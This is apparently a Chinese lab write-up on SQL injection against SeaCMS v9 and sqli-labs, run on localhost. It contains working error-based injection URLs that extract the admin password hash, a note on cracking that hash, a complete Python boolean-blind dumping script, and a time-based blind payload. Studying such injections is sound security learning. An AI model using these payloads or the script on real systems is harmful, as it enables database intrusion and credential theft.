---
layout: post
title: "seacmsv9注入管理员账号密码orderbylimit"
date: 2025-03-12 09:35:16 +0800
description: "注入密码为23a7bbd73250516f069d，可以看出是经过md5加密的，于是到https://cmd5.com/ 解密，得到密码为admin123。海洋影视管理系统是专为不同需求的站长而设计的视频点播系统，采用的是 php5.X+mysql 的架构。如果页面响应时间延迟，则说明条件成立；"
keywords: "seacmsv9注入管理员账号密码+orderby+limit"
categories: ['未分类']
tags: ['网络']
artid: "146196298"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146196298
    alt: "seacmsv9注入管理员账号密码orderbylimit"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146196298
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146196298
cover: https://bing.ee123.net/img/rand?artid=146196298
image: https://bing.ee123.net/img/rand?artid=146196298
img: https://bing.ee123.net/img/rand?artid=146196298
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     seacmsv9注入管理员账号密码+orderby+limit
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="./../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="./../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <p>
     一、网上收集：
    </p>
    <p>
     海洋影视管理系统是专为不同需求的站长而设计的视频点播系统，采用的是 php5.X+mysql 的架构
    </p>
    <p>
     二、经过源码分析，使用以下语句注入：
    </p>
    <blockquote>
     <p>
      http://localhost/upload/comment/api/index.php?gid=1&amp;page=2&amp;type=1&amp;rlist[]=@`'`, updatexml(1,concat_ws(0x20,0x5c,(select name from%23%0asea_admin limit 0,1)),1), @`'`
     </p>
    </blockquote>
    <p>
     三、没有成功，使用Wireshark抓包:
    </p>
    <blockquote>
     <p>
      SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment
      <br/>
      WHERE m_type=1 AND id in (@`\'`, updatexml(1,concat_ws(0x20,0x5c,(select name from#
      <br/>
      sea_admin limit 0,1)),1), @`\'`) ORDER BY id DESC
     </p>
    </blockquote>
    <p>
     四、在地址栏尝试注入语句，成功注入出账号为admin：
    </p>
    <blockquote>
     <p>
      password：
      <br/>
      http://localhost/upload/comment/api/index.php?gid=1&amp;page=2&amp;type=1&amp;rlist[]=@`'`, updatexml(1,concat_ws(0x20,0x5c,(select password from%23%0asea_admin limit 0,1)),1), @`'`
     </p>
    </blockquote>
    <blockquote>
     <p>
      注入密码为23a7bbd73250516f069d，可以看出是经过md5加密的，于是到https://cmd5.com/ 解密，得到密码为admin123
     </p>
    </blockquote>
    <p>
     <img alt="" height="228" src="https://i-blog.csdnimg.cn/direct/f0ac28b7f91f4381b8a551f265db9047.jpeg" width="900"/>
    </p>
    <p>
     <img alt="" height="224" src="https://i-blog.csdnimg.cn/direct/1ee1441bb5424396b31789bd8fa31d69.jpeg" width="1048">
     </img>
    </p>
    <p>
     布尔盲注
    </p>
    <blockquote>
     <p>
      import requests
      <br/>
      from bs4 import BeautifulSoup
     </p>
     <p>
      def get_username(resp):
      <br/>
      soup = BeautifulSoup(resp,'html.parser')
      <br/>
      username = soup.select('body &gt; div:nth-child(1) &gt; font:nth-child(4) &gt; tr &gt; td:nth-child(2)')[0].text
      <br/>
      return username
     </p>
     <p>
      def inject_database_boolen():
      <br/>
      tables = ''
      <br/>
      i = 1
      <br/>
      while True:
      <br/>
      left = 32
      <br/>
      right = 127
      <br/>
      mid = (left + right) // 2
      <br/>
      while left &lt; right:
      <br/>
      url = f"http://localhost/sqli-labs-master/Less-46/index.php?sort=if(ascii(substr(database(),{i},1))&gt;{mid},id,username) -- "
      <br/>
      resp = requests.get(url)
      <br/>
      if 'Dumb' == get_username(resp.text):
      <br/>
      left = mid + 1
      <br/>
      else:
      <br/>
      right = mid
      <br/>
      mid = (left + right) // 2
      <br/>
      if mid == 32:
      <br/>
      break
      <br/>
      tables += chr(mid)
      <br/>
      i += 1
      <br/>
      print(tables)
     </p>
     <p>
      def inject_table_boolen():
      <br/>
      tables = ''
      <br/>
      i = 1
      <br/>
      while True:
      <br/>
      left = 32
      <br/>
      right = 127
      <br/>
      mid = (left + right) // 2
      <br/>
      while left &lt; right:
      <br/>
      url = f"http://localhost/sqli-labs-master/Less-46/index.php?sort=if(ascii(substr((select group_concat(table_name) from \
      <br/>
      information_schema.tables where table_schema=database()),{i},1))&gt;{mid},id,username) -- "
      <br/>
      resp = requests.get(url)
      <br/>
      if 'Dumb' == get_username(resp.text):
      <br/>
      left = mid + 1
      <br/>
      else:
      <br/>
      right = mid
      <br/>
      mid = (left + right) // 2
      <br/>
      if mid == 32:
      <br/>
      break
      <br/>
      tables += chr(mid)
      <br/>
      i += 1
      <br/>
      print(tables)
     </p>
     <p>
      def inject_column_boolen():
      <br/>
      tables = ''
      <br/>
      i = 1
      <br/>
      while True:
      <br/>
      left = 32
      <br/>
      right = 127
      <br/>
      mid = (left + right) // 2
      <br/>
      while left &lt; right:
      <br/>
      url = f"http://localhost/sqli-labs-master/Less-46/index.php?sort=if(ascii(substr((select group_concat(column_name) from \
      <br/>
      information_schema.columns where table_schema=database() and table_name='users'),{i},1))&gt;{mid},id,username) -- "
      <br/>
      resp = requests.get(url)
      <br/>
      if 'Dumb' == get_username(resp.text):
      <br/>
      left = mid + 1
      <br/>
      else:
      <br/>
      right = mid
      <br/>
      mid = (left + right) // 2
      <br/>
      if mid == 32:
      <br/>
      break
      <br/>
      tables += chr(mid)
      <br/>
      i += 1
      <br/>
      print(tables)
     </p>
     <p>
      def inject_data_boolen():
      <br/>
      tables = ''
      <br/>
      i = 1
      <br/>
      while True:
      <br/>
      left = 32
      <br/>
      right = 127
      <br/>
      mid = (left + right) // 2
      <br/>
      while left &lt; right:
      <br/>
      url = f"http://localhost/sqli-labs-master/Less-46/index.php?sort=if(ascii(substr((select group_concat(username,':',password) \
      <br/>
      from users),{i},1))&gt;{mid},id,username) -- "
      <br/>
      resp = requests.get(url)
      <br/>
      if 'Dumb' == get_username(resp.text):
      <br/>
      left = mid + 1
      <br/>
      else:
      <br/>
      right = mid
      <br/>
      mid = (left + right) // 2
      <br/>
      if mid == 32:
      <br/>
      break
      <br/>
      tables += chr(mid)
      <br/>
      i += 1
      <br/>
      print(tables)
     </p>
     <p>
      if __name__ == '__main__':
      <br/>
      # inject_database_boolen()
      <br/>
      # inject_table_boolen()
      <br/>
      # inject_column_boolen()
      <br/>
      inject_data_boolen()
     </p>
    </blockquote>
    <ul>
     <li>
      <p>
       <strong>
        时间盲注
       </strong>
       ：
      </p>
      <code>
       ORDER BY IF((SELECT SUBSTR(password,1,1) FROM sea_admin LIMIT 0,1)='a', SLEEP(5), 1)
      </code>
      <p>
       如果页面响应时间延迟，则说明条件成立；
      </p>
     </li>
    </ul>
    <p>
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323230315f37353532313630372f:61727469636c652f64657461696c732f313436313936323938" class_="artid" style="display:none">
 </p>
</div>


